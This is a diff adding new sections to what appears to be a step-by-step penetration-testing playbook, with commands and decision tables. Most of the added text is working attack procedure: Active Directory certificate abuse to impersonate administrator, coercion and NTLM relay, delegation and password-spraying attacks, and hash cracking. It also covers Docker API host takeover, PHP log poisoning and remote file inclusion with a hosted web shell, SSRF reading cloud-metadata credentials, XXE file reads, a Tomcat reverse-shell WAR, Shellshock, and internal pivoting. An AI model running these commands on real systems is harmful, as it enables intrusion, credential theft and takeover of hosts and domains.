@@ -137,6 +137,12 @@ Pick one service with a real lead and open its task. An unidentified service ret
 - snmp_reported: SNMP was reported. SNMP-01 tests one community. Next: SNMP-01.
 - database_reported: A database was reported. DB-01 confirms the engine and login. Next: DB-01.
 - mail_reported: A mail protocol was reported. MAIL-01 confirms protocol and TLS. Next: MAIL-01.
+- smtp_reported: SMTP was reported. SMTP-01 checks users and relay. Next: SMTP-01.
+- docker_reported: A Docker API was reported. DOCKER-01 tests it unauthenticated. Next: DOCKER-01.
+- jenkins_reported: Jenkins was reported. JENKINS-01 checks the script console. Next: JENKINS-01.
+- tftp_reported: TFTP was reported. TFTP-01 tests one filename. Next: TFTP-01.
+- rsync_reported: Rsync was reported. RSYNC-01 lists modules. Next: RSYNC-01.
+- ipmi_reported: IPMI was reported. IPMI-01 checks the BMC. Next: IPMI-01.
 - rdp_reported: RDP was reported. RDP-01 checks the permitted account. Next: RDP-01.
 - product_bearing_service_selected: A non-web service carries a scanner-qualified product. One candidate review is justified. Next: EXP-01.
 - other_service: No task matches the service. Keep a specific gap. Next: GAP-SERVICE.
@@ -298,7 +304,7 @@ curl -i '<EXACT_URL>'
 | 404 or soft-404 | **WEB-04** with the missing-path baseline. |
 | Repeated 5xx, 429 or broken transport | **PAUSE-COVERAGE**. |
 
-GET and request work continues at **WEB-06** and **WEB-08**.
+GET and request work continues at **WEB-06** and **WEB-08**. Advanced paths: **WEB-13**, **WEB-14**, **WEB-15**, **WEB-16**, **WEB-17**, **WEB-18**, **WEB-19**.
 
 ## WEB-04 Discover unlinked directories and files
 
@@ -529,6 +535,7 @@ nxc smb <TARGET_IP> -d <DOMAIN> -u <USERNAME> -H '<NTLM_HASH>'
 | Admin indicated | **AD-13** on this host. |
 | Rejected | **PAUSE-ROUTE**. |
 | Ambiguous | **PAUSE-COVERAGE**. |
+| Many accounts and one password candidate | **PASS-01**. |
 
 After a credential works, revisit only a question that was blocked on it:
 
@@ -658,6 +665,8 @@ Mark only the successfully authenticated principal as Owned. An edge is a candid
 | Result | Next |
 | --- | --- |
 | LAPS / replication / RBCD / gMSA / GPO / object right | **AD-10** / **AD-11** / **AD-16** / **AD-17** / **AD-18** / **AD-19**. |
+| Certificate-service right or CA clue | **ADCS-01**. |
+| Delegation flag or writable SPN | **DELEG-01**. |
 | Local admin or WinRM edge | **AD-13** / **AD-12**. |
 | No edge, other service lead | **NET-05**. |
 | Partial collection | **PAUSE-COVERAGE**. |
@@ -1138,6 +1147,7 @@ On Kali: `chisel server --reverse --port '<PORT>'`, then `nmap -sT -Pn -p '<LOCA
 | Listener unclear | **PAUSE-COVERAGE**. |
 | Port open, protocol unknown | **GAP-SERVICE**. |
 | Port does not close | **PAUSE-RECOVERY**. |
+| Forwarded service lives on another internal host | **PIVOT-01**. |
 
 ## AD-20. Use one exact MSSQL service ticket to test SQL access
 
@@ -1154,6 +1164,219 @@ KRB5CCNAME='<CCACHE>' impacket-mssqlclient -windows-auth -k -no-pass '<DOMAIN>/<
 | SPN, time or tunnel mismatch | **PAUSE-ROUTE**. |
 | SQL rejects the ticket | **PAUSE-COVERAGE**. |
 
+# adcs
+
+ADCS is a certificate-service path on the domain controller. Use only on an authorized disposable set.
+
+## ADCS-01. Is a CA reachable and which templates are vulnerable?
+
+```bash
+certipy-ad find -u '<USER>@<DOMAIN>' -p '<PASS>' -dc-ip '<DC_IP>' -vulnerable -stdout
+```
+
+Read the CA name, template names, enrolment rights and the reported ESC classes. A flagged template still needs its rights and input requirements to match.
+
+| Result | Next |
+| --- | --- |
+| ESC1 with enrol rights | **ADCS-02**. |
+| ESC8 or a web enrolment endpoint | **ADCS-04**, then **RELAY-02**. |
+| ESC4/ESC7 template control | Template edit path; use **ADCS-02** shape with the modified template. |
+| Nothing vulnerable | **AD-09** for another right. |
+| Find denied | **PAUSE-COVERAGE**. |
+
+## ADCS-02. Can one certificate be issued for a higher principal?
+
+```bash
+certipy-ad req -u '<USER>@<DOMAIN>' -p '<PASS>' -ca '<CA_NAME>' -template '<TEMPLATE>' -upn 'administrator@<DOMAIN>' -dc-ip '<DC_IP>'
+```
+
+A returned `.pfx` is issued material, not a session.
+
+| Result | Next |
+| --- | --- |
+| `.pfx` written | **ADCS-03**. |
+| Request denied or template mismatch | **ADCS-01** with the exact reason. |
+| CA or DC unreachable | **PAUSE-ROUTE**. |
+
+## ADCS-03. Does the certificate authenticate as that principal?
+
+```bash
+certipy-ad auth -pfx 'administrator.pfx' -dc-ip '<DC_IP>'
+```
+
+This returns a TGT and, for a DC-issued cert, often the account's NT hash.
+
+| Result | Next |
+| --- | --- |
+| ccache or hash for the intended account | **AD-03** for one host, or **AD-13** if admin is indicated. |
+| Auth fails | **ADCS-01**; check UPN, template and issuance time. |
+| Clock or DC mismatch | **PAUSE-ROUTE**. |
+
+## ADCS-04. Is web enrolment exposed?
+
+```bash
+curl -sS -i 'http://<CA_HOST>/certsrv/'
+certipy-ad find -u '<USER>@<DOMAIN>' -p '<PASS>' -dc-ip '<DC_IP>' -stdout | Select-String 'Web Enrollment'
+```
+
+An exposed `/certsrv` with NTLM auth is the ESC8 precondition.
+
+| Result | Next |
+| --- | --- |
+| Endpoint answers with NTLM or basic auth | **RELAY-02** against the CA. |
+| Endpoint absent | **ADCS-02** for the template path. |
+
+# ad_abuse
+
+Coercion, relay and delegation. Each task assumes a validated domain identity and an attributed target.
+
+## COERCE-01. Does the target authenticate to a listener?
+
+Start a capture first:
+
+```bash
+responder -I '<IFACE>' -A
+```
+
+Then coerce one target:
+
+```bash
+python3 PetitPotam.py -d '<DOMAIN>' -u '<USER>' -p '<PASS>' '<KALI_IP>' '<TARGET_IP>'
+python3 printerbug.py '<DOMAIN>/<USER>:<PASS>@<TARGET_IP>' '<KALI_IP>'
+```
+
+A captured NetNTLMv2 hash proves coercion.
+
+| Result | Next |
+| --- | --- |
+| Hash captured | **PASS-02** to crack it, or **RELAY-02** to relay it. |
+| No authentication arrives | Check the interface and target service; **PAUSE-COVERAGE**. |
+| RPC denied | **AD-03** on another host. |
+
+## RELAY-01. Can NetNTLM be captured without coercion?
+
+```bash
+responder -I '<IFACE>' -A
+```
+
+Leave it running while normal traffic and a coerce run. `-A` analyses instead of answering, so it will not break SMB.
+
+| Result | Next |
+| --- | --- |
+| NetNTLMv2 from a user or machine | **PASS-02** or **RELAY-02**. |
+| Nothing in the window | **COERCE-01** for a deliberate trigger. |
+
+## RELAY-02. Can the authentication be relayed?
+
+SMB signing must be off on the target. Relay to LDAP for a machine account and RBCD:
+
+```bash
+ntlmrelayx.py -t ldaps://'<DC_IP>' -smb2support --delegate-access --escalate-user '<CONTROLLED_COMPUTER>$'
+```
+
+Run **COERCE-01** against a target in the same window, then read the created delegation.
+
+| Result | Next |
+| --- | --- |
+| Machine account created and RBCD set | **AD-16** for the ticket and shell path. |
+| LDAP signing required | Relay to SMB or HTTP instead, or **PAUSE-COVERAGE**. |
+| SMB signing enforced | Record it; relay that host by LDAP/HTTP or pick another target. |
+| No authentication | **COERCE-01**. |
+
+## DELEG-01. Which delegation rights exist?
+
+```bash
+ldapsearch -x -H 'ldap://<DC_IP>' -D '<USER>@<DOMAIN>' -w '<PASS>' -b '<BASE_DN>' \
+  '(|(userAccountControl:1.2.840.113556.1.4.803:=524288)(msDS-AllowedToDelegateTo=*))' \
+  sAMAccountName userAccountControl msDS-AllowedToDelegateTo
+```
+
+Bit 524288 is unconstrained; `msDS-AllowedToDelegateTo` is constrained.
+
+| Result | Next |
+| --- | --- |
+| Unconstrained account you control or can use | **DELEG-03**. |
+| Constrained entry with an interesting SPN | **DELEG-02**. |
+| Only RBCD rights | **AD-16**. |
+
+## DELEG-02. Can constrained delegation be abused?
+
+With protocol transition (`TRUSTED_TO_AUTH_FOR_DELEGATION`) and a service secret:
+
+```bash
+impacket-getST -spn '<TARGET_SPN>' -impersonate administrator -dc-ip '<DC_IP>' '<DOMAIN>/<SVC_ACCOUNT>':'<PASS>'
+KRB5CCNAME='administrator.ccache' impacket-psexec -k -no-pass '<DOMAIN>/administrator@<TARGET_HOST>'
+```
+
+Without protocol transition you need a service ticket for the delegating account first.
+
+| Result | Next |
+| --- | --- |
+| Ticket usable for the SPN | **WIN-01** in the shell. |
+| `KDC_ERR_BADOPTION` | No protocol transition; get a service ticket first or **PAUSE-COVERAGE**. |
+| Wrong SPN | **DELEG-01** for the recorded value. |
+
+## DELEG-03. Can unconstrained delegation be captured?
+
+On the delegating host, monitor for tickets:
+
+```powershell
+& '<RUBEUS>' monitor /interval:5 /nowrap
+```
+
+Coerce the DC to that host with **COERCE-01**, then submit the captured ticket:
+
+```powershell
+& '<RUBEUS>' ptt /ticket:<BASE64_TICKET>
+klist
+```
+
+| Result | Next |
+| --- | --- |
+| DC ticket in the cache | **AD-11** with the DC identity, or **AD-13** on the DC. |
+| No ticket | Check the account really has unconstrained delegation; **PAUSE-COVERAGE**. |
+| Coercion failed | **COERCE-01** on the host. |
+
+# password_attacks
+
+Spray and crack one credential source at a time.
+
+## PASS-01. Can one password be sprayed safely?
+
+Read the lockout policy before spraying:
+
+```bash
+nxc smb '<DC_IP>' -u '<USER>' -p '<PASS>' --pass-pol
+```
+
+Then try one password against the user list, stopping on the first success per account:
+
+```bash
+nxc smb '<DC_IP>' -u users.txt -p '<PASSWORD>' --continue-on-success
+```
+
+| Result | Next |
+| --- | --- |
+| One or more valid logins | **AD-03** with each identity, one host at a time. |
+| All fail, policy allows more | One other evidence-based password, not a wordlist. |
+| Lockout risk | Respect the threshold minus one; **PAUSE-COVERAGE**. |
+
+## PASS-02. Can a captured hash be identified and cracked?
+
+```bash
+hashid '<HASH>'
+hashcat -m 1000 '<NTLM_HASH>' /usr/share/wordlists/rockyou.txt
+hashcat -m 5600 '<NETNTLMv2_HASH>' /usr/share/wordlists/rockyou.txt
+```
+
+`-m 1000` is NTLM, `-m 5600` is NetNTLMv2. `--show` lists a recovered value.
+
+| Result | Next |
+| --- | --- |
+| Plaintext recovered | **AD-03** for one host, or **WIN-10** for a process switch. |
+| Not in rockyou | Record it; **PAUSE-COVERAGE** or a selected rule set. |
+| Wrong mode | **hashid** output again; do not try every mode. |
+| NTLM used directly | Pass-the-hash at **AD-03** with `-H`. |
 # redis
 
 ## REDIS-01. Does this Redis endpoint permit the intended connection?
@@ -1766,6 +1989,7 @@ Add `-starttls smtp|imap|pop3` for STARTTLS. Then send `EHLO x`/`QUIT`, `a1 CAPA
 | IMAP with mailbox account | **MAIL-02**. |
 | POP3 with account | **MAIL-03**. |
 | SMTP only | **NET-05**. |
+| SMTP user or relay question | **SMTP-01**. |
 | Certificate failure | **PAUSE-ROUTE**. |
 
 ## MAIL-02. Can this identity read one relevant message without changing flags?
@@ -1853,6 +2077,108 @@ whoami
 
 Continue with the Windows token check at [WIN-01](./win-01.md).
 
+# other_services
+
+Service-specific paths that NET-05 can select.
+
+## SMTP-01. Can users be enumerated or mail relayed?
+
+```bash
+smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt -t '<TARGET>'
+swaks --to 'test@example.com' --from 'a@example.com' --server '<TARGET>' --body 'relay'
+```
+
+Send to an external address to test relay. `250` after `RCPT` is acceptance, not delivery.
+
+| Result | Next |
+| --- | --- |
+| Users returned | **AD-03** with a discovered name, or **MAIL-01** for a mailbox. |
+| Relay accepted to an outside domain | Record it; it is a finding, not a shell. |
+| `VRFY` disabled | `smtp-user-enum -M RCPT` once. |
+| Connection refused | **NET-03**. |
+
+## TFTP-01. Can a file be read?
+
+```bash
+nmap -sU -p 69 --script tftp-enum '<TARGET>'
+tftp '<TARGET>'
+```
+
+At the prompt: `binary`, `get <FILE>`, `quit`.
+
+| Result | Next |
+| --- | --- |
+| File retrieved | **ART-01** if it contains a lead. |
+| Timeout | **NET-04**. |
+| No file name | Try `README`, `config`, `backup.zip` once each. |
+
+## RSYNC-01. Is a module exposed?
+
+```bash
+nc -nv '<TARGET>' 873
+rsync rsync://'<TARGET>'/
+rsync -av 'rsync://<TARGET>/<MODULE>' ./rsync-copy/
+```
+
+| Result | Next |
+| --- | --- |
+| Module list | Read one module with `rsync -av`. |
+| Files retrieved | **ART-01** on a selected file. |
+| Connection refused | **NET-03**. |
+
+## DOCKER-01. Is the Docker API unauthenticated?
+
+```bash
+curl -sS 'http://<TARGET>:2375/version'
+curl -sS 'http://<TARGET>:2375/containers/json'
+```
+
+Create a privileged container that mounts the host:
+
+```bash
+curl -sS -X POST -H 'Content-Type: application/json' 'http://<TARGET>:2375/containers/create?name=owb' \
+  -d '{"Image":"alpine","Cmd":["/bin/sh","-c","chroot /host /bin/sh -c id"],"HostConfig":{"Binds":["/:/host"]}}'
+curl -sS -X POST 'http://<TARGET>:2375/containers/owb/start'
+curl -sS 'http://<TARGET>:2375/containers/owb/logs?stdout=1'
+```
+
+| Result | Next |
+| --- | --- |
+| `uid=0` from the host | Host root; **LNX-01** for context. |
+| 403 or 401 | **PAUSE-COVERAGE**. |
+| Image missing | `{"Image":"<existing image>"}` from `/images/json`. |
+
+## JENKINS-01. Is the script console open?
+
+```bash
+curl -sS -i 'http://<TARGET>:<PORT>/script'
+curl -sS -i 'http://<TARGET>:<PORT>/asynchPeople/'
+```
+
+In the script console Groovy:
+
+```groovy
+println "id".execute().text
+```
+
+| Result | Next |
+| --- | --- |
+| Console executes | **EXP-01** for a shell. |
+| 401 | Try `admin:admin`; otherwise **PAUSE-COVERAGE**. |
+| No console | **WEB-04**. |
+
+## IPMI-01. Is the BMC reachable on UDP 623?
+
+```bash
+sudo nmap -sU -p 623 --script ipmi-version '<TARGET>'
+ipmitool -I lanplus -H '<TARGET>' -U ADMIN -P ADMIN chassis status
+```
+
+| Result | Next |
+| --- | --- |
+| Version output | Try the default credential once; record the hash if prompted. |
+| Hash captured | **PASS-02** with mode 7300. |
+| Silent | **NET-04**. |
 # web_input
 
 Start from the working request at WEB-06/08. Form stays POST: repeat every required field and a fresh CSRF value. For an existing session add `--header '@<HEADERS>'` only on the same origin.
@@ -2250,6 +2576,119 @@ Restore before closing: paste `original.php` back, save once, re-read, compare w
 | Save rejected or source mismatch | **PAUSE-RECOVERY**. |
 | Restore mismatch or broken page | **PAUSE-RECOVERY** with the out-of-band route. |
 
+# web_advanced
+
+Each task needs a verified input or endpoint from WEB-06/08/12.
+
+## WEB-13. Can a file parameter reach source or logs?
+
+```bash
+curl -sS '<URL>?<FIELD>=php://filter/convert.base64-encode/resource=index.php' | base64 -d
+curl -sS -A '<?php system($_GET["c"]); ?>' '<URL>'
+curl -sS '<URL>?<FIELD>=/var/log/apache2/access.log&c=id'
+```
+
+The first reads source; the second writes PHP into the access log; the third executes it. Use the real log path if Apache differs.
+
+| Result | Next |
+| --- | --- |
+| Source or `uid=` output | **EXP-01** for a shell path, or **WEB-13** again for another file. |
+| Base64 decodes to PHP | Read `config.php` and similar files. |
+| Log path wrong | Try `/var/log/nginx/access.log`, then **PAUSE-COVERAGE**. |
+| Filter disabled | Plain traversal at **WREAD-01**. |
+
+## WEB-14. Can the parameter include a remote file?
+
+Host a PHP shell on Kali:
+
+```bash
+printf '<?php system($_GET["c"]); ?>' > shell.php
+python3 -m http.server 80
+```
+
+```bash
+curl -sS '<URL>?<FIELD>=http://<KALI_IP>/shell.php&c=id'
+```
+
+| Result | Next |
+| --- | --- |
+| `uid=` output | **EXP-01**, then **SHELL-01**. |
+| Source echoed only | Handler not parsing; **WEB-13**. |
+| Connection blocked | **PAUSE-COVERAGE**; allow `allow_url_include`. |
+
+## WEB-15. Does the server fetch a URL you choose?
+
+```bash
+curl -sS '<URL>?<FIELD>=http://127.0.0.1:<PORT>/'
+curl -sS '<URL>?<FIELD>=http://169.254.169.254/latest/meta-data/'
+```
+
+Use a listener (`nc -lvnp <PORT>`) to confirm a callback.
+
+| Result | Next |
+| --- | --- |
+| Internal response or callback | **NET-05** on the internal port, or **PIVOT-01**. |
+| Only a generic page | **PAUSE-COVERAGE**; try `gopher://`, `file://` once. |
+| Cloud metadata | Read credentials from the returned JSON. |
+
+## WEB-16. Does an XML endpoint resolve external entities?
+
+```bash
+cat > xxe.xml <<'EOF'
+<?xml version="1.0"?>
+<!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]>
+<r>&x;</r>
+EOF
+curl -sS -X POST -H 'Content-Type: application/xml' --data-binary @xxe.xml '<URL>'
+```
+
+| Result | Next |
+| --- | --- |
+| File content in the response | **WEB-13** for source, **NET-05** for config. |
+| No expansion | **PAUSE-COVERAGE**; check the parser and content type. |
+
+## WEB-17. Is access control or a default credential the gap?
+
+```bash
+curl -sS -i '<URL>?id=1'
+curl -sS -i '<URL>?id=2'
+curl -sS -i -u 'admin:admin' '<URL>'
+curl -sS -i -H 'X-Forwarded-For: 127.0.0.1' '<URL>/admin'
+```
+
+| Result | Next |
+| --- | --- |
+| Another record with a different owner | IDOR; collect the useful object. |
+| Default credential works | **WEB-09** for the account view. |
+| Header bypasses the restriction | Record the header; continue at **WEB-09**. |
+| All denied | **WEB-04** for another path. |
+
+## WEB-18. Is a Tomcat manager exposed?
+
+```bash
+curl -sS -i 'http://<TARGET>:<PORT>/manager/html'
+msfvenom -p java/jsp_shell_reverse_tcp LHOST='<KALI_IP>' LPORT='<PORT>' -f war -o shell.war
+curl -sS -u 'tomcat:tomcat' --upload-file shell.war 'http://<TARGET>:<PORT>/manager/text/deploy?path=/shell'
+curl -sS 'http://<TARGET>:<PORT>/shell/'
+```
+
+| Result | Next |
+| --- | --- |
+| Deploy accepted and callback | **EXP-03**, then **WIN-01** or **LNX-01**. |
+| 401 | Try `tomcat:tomcat`, `admin:admin` once each. |
+| No manager | **WEB-04** for another path. |
+
+## WEB-19. Is a CGI script vulnerable to Shellshock?
+
+```bash
+curl -sS -i -H 'User-Agent: () { :; }; /bin/bash -c "id"' 'http://<TARGET>/cgi-bin/<SCRIPT>'
+```
+
+| Result | Next |
+| --- | --- |
+| `uid=` in the headers/body | **EXP-01** for a Bash callback. |
+| No output | Try another script from WEB-04. |
+| 500 only | **PAUSE-COVERAGE**. |
 # access
 
 ## EXP-01. Does one candidate fit the observed endpoint and context?
@@ -2402,6 +2841,66 @@ sha256sum ./artifact.bin
 
 Keep the local copy at 0600 and delete it after use.
 
+# pivoting
+
+Reach one internal service through a host you already control.
+
+## PIVOT-01. Can SSH forward the needed port?
+
+Local forward to a service on the pivot's network:
+
+```bash
+ssh -N -L '<LOCAL_PORT>:<INTERNAL_HOST>:<INTERNAL_PORT>' '<USER>@<PIVOT_IP>'
+```
+
+Remote forward when the pivot cannot reach Kali directly:
+
+```bash
+ssh -N -R '<KALI_PORT>:<INTERNAL_HOST>:<INTERNAL_PORT>' '<USER>@<PIVOT_IP>'
+```
+
+| Result | Next |
+| --- | --- |
+| Port answers locally | The matching service task at `127.0.0.1:<LOCAL_PORT>`. |
+| Forward refused | Check `AllowTcpForwarding`; **PIVOT-02** instead. |
+| Auth denied | **SSH-01**. |
+
+## PIVOT-02. Can a non-SSH tunnel carry the port?
+
+Chisel reverse tunnel from the pivot:
+
+```bash
+chisel server --reverse --port '<KALI_PORT>'
+./chisel client 'http://<KALI_IP>:<KALI_PORT>' 'R:<LOCAL_PORT>:<INTERNAL_HOST>:<INTERNAL_PORT>'
+```
+
+Or one-shot socat:
+
+```bash
+socat TCP-LISTEN:<LOCAL_PORT>,fork TCP:<INTERNAL_HOST>:<INTERNAL_PORT>
+```
+
+| Result | Next |
+| --- | --- |
+| Local port answers | Service task through `127.0.0.1`. |
+| Tunnel works, internal range needs scanning | **PIVOT-03**. |
+| Client cannot egress | Try 443/80 outbound or **PAUSE-COVERAGE**. |
+| Tunnel drops | Keep the command output; **PAUSE-RECOVERY**. |
+
+## PIVOT-03. Can the internal range be scanned through the pivot?
+
+```bash
+printf 'socks5 127.0.0.1 <SOCKS_PORT>\n' > proxychains.conf
+proxychains -f proxychains.conf nmap -sT -Pn -p 22,80,139,443,445,3389 '<INTERNAL_SUBNET>'
+```
+
+Use `-sT`; SYN scans do not traverse a proxy cleanly.
+
+| Result | Next |
+| --- | --- |
+| Live internal hosts and ports | **NET-05** on that host through the same tunnel. |
+| Only timeouts | Confirm the tunnel with one known port first. |
+| Partial results | **PAUSE-COVERAGE**. |
 # local_artifact
 
 ## ART-01. Does this exact downloaded file contain a usable next lead?
@@ -4444,6 +4943,55 @@ A loopback tunnel forwards one port; it does not grant scope.
 
 One MSSQLSvc ticket through the live tunnel answers only the SQL login.
 
+## ADCS-01. What decides this step?
+
+Find reports vulnerable templates; the rights and inputs must still match.
+
+## ADCS-02. What decides this step?
+
+ESC1 issues a certificate for the UPN you supply.
+
+## ADCS-03. What decides this step?
+
+The PFX authenticates as the certificate principal.
+
+## ADCS-04. What decides this step?
+
+Web enrolment is the ESC8 relay precondition.
+
+## COERCE-01. What decides this step?
+
+A successful coerce proves the target authenticates to your listener.
+
+## RELAY-01. What decides this step?
+
+Analyze mode captures NetNTLM without answering.
+
+## RELAY-02. What decides this step?
+
+LDAP relay with delegate-access creates RBCD from machine auth.
+
+## DELEG-01. What decides this step?
+
+The UAC bit and SPN list distinguish unconstrained from constrained.
+
+## DELEG-02. What decides this step?
+
+Protocol transition lets a service ticket impersonate any user.
+
+## DELEG-03. What decides this step?
+
+Unconstrained delegation caches a DC ticket when the DC is coerced.
+
+## PASS-01. What decides this step?
+
+The lockout policy decides how many attempts are safe.
+
+## PASS-02. What decides this step?
+
+Identify the hash before choosing a hashcat mode.
+
+
 ## REDIS-01. What decides this step?
 
 `PONG` is access; `NOAUTH` without a credential ends the branch.
@@ -4588,6 +5136,31 @@ Certificate verification stays on unless a fingerprint is supplied.
 
 Host and account must match before the token is examined.
 
+## SMTP-01. What decides this step?
+
+VRFY/RCPT names users; an outside RCPT tests relay.
+
+## TFTP-01. What decides this step?
+
+TFTP has no auth; enumerate a filename first.
+
+## RSYNC-01. What decides this step?
+
+An exposed module lists and copies files.
+
+## DOCKER-01. What decides this step?
+
+An open Docker API starts a host-mounted container.
+
+## JENKINS-01. What decides this step?
+
+The Groovy console executes on the controller.
+
+## IPMI-01. What decides this step?
+
+The BMC default credential and its hash are the useful outputs.
+
+
 ## WREAD-01. What decides this step?
 
 A traversal probe is compared with the ordinary file and a missing-file control.
@@ -4664,6 +5237,35 @@ The proof file returns identity and can open one callback.
 
 The template is captured, replaced, proven and restored.
 
+## WEB-13. What decides this step?
+
+Wrappers read source; a log file turns the parameter into execution.
+
+## WEB-14. What decides this step?
+
+Remote inclusion runs your shell from Kali.
+
+## WEB-15. What decides this step?
+
+A fetch primitive reaches loopback or cloud metadata.
+
+## WEB-16. What decides this step?
+
+An external entity resolves a local file into the response.
+
+## WEB-17. What decides this step?
+
+IDOR, default credentials and header trust are the cheap access checks.
+
+## WEB-18. What decides this step?
+
+Tomcat manager deploys a WAR for a shell.
+
+## WEB-19. What decides this step?
+
+Shellshock runs commands through a crafted header.
+
+
 ## EXP-01. What decides this step?
 
 Candidate review compares every prerequisite, not a title.
@@ -4691,6 +5293,19 @@ Hash the file on both sides; transfer does not execute it.
 ## XFER-02. What decides this step?
 
 Only an authenticated encrypted copy protects sensitive files.
+
+## PIVOT-01. What decides this step?
+
+SSH forwards one port in either direction.
+
+## PIVOT-02. What decides this step?
+
+Chisel or socat carries the port when SSH forwarding is blocked.
+
+## PIVOT-03. What decides this step?
+
+A SOCKS proxy plus connect scans reaches the internal range.
+
 
 ## ART-01. What decides this step?
 
